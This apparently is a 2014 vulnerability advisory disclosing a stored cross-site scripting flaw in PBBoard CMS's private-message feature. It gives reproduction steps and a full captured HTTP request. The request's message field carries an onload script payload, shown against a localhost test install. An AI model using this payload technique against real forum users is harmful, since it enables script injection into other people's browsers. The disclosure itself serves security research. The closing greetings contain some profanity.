@@ -1,0 +1,84 @@
+############################################################################## 
+# Exploit Title   : PBBoard CMS Stored xss vulnerability
+# Author          : Manish Kishan Tanwar  
+# Vendor          : http://www.pbboard.info/
+# version affected: all
+# Date            : 7/12/2014 
+# Discovered @    : INDISHELL Lab
+# Love to         : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,jagriti
+# email           : manish.1046@gmail.com
+############################################################################## 
+////////////////////////
+/// Overview: 
+//////////////////////// 
+Program PBBoard is interactive Forum management program Dialogic
+Free classified software Free and open source.
+///////////////////////////////
+// Vulnerability Description: 
+///////////////////////////////
+
+Stored xss vulnerability exist in "send private message" module, a user can send xss crafted private message to other user, and when reciever will open the message xss payload will execute
+
+//////////////////////////////
+///  Proof of Concept: -
+//////////////////////////////
+
+go to "inbox", click "compose message"
+type username, title and message body , intercept the request and change the
+content of "text" parameter with xss payload 
+when reciever will open the message, xss payload will execute
+
+Proof image:- http://oi57.tinypic.com/112d5cx.jpg
+
+//////////////////////
+///Demo POC Request///
+//////////////////////
+
+POST /PBBoard_v3.0.1/index.php?page=pm_send&send=1&start=1 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:23.0) Gecko/20100101 Firefox/23.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/PBBoard_v3.0.1/index.php?page=pm_send&send=1&index=1&username=ica
+Cookie: PowerBB_lastvisit=1417951132; PowerBB_username=ica; PowerBB_password=8a2d334536b2f4146af8cf46acd85110; security_level=0;PHPSESSID=thouojqch98pigioioepn8n2h1
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------147872036312473
+Content-Length: 670
+
+-----------------------------147872036312473
+Content-Disposition: form-data; name="to[]"
+
+ica
+-----------------------------147872036312473
+Content-Disposition: form-data; name="title"
+
+hi
+-----------------------------147872036312473
+Content-Disposition: form-data; name="text"
+
+hii</div><font color=red><body onload="prompt( String.fromCharCode(120,115,115,32,116,101,115,116));">//
+-----------------------------147872036312473
+Content-Disposition: form-data; name="icon"
+
+look/images/icons/i1.gif
+-----------------------------147872036312473
+Content-Disposition: form-data; name="insert"
+
+Save
+-----------------------------147872036312473--
+
+
+
+                             --==[[ Greetz To ]]==--
+############################################################################################
+#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba, 
+#Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
+#Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA,
+#Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk
+#############################################################################################
+                             --==[[Love to]]==--
+# My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
+#Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Don(Deepika kaushik)
+                       --==[[ Special Fuck goes to ]]==--
+                            <3  suriya Cyber Tyson <3
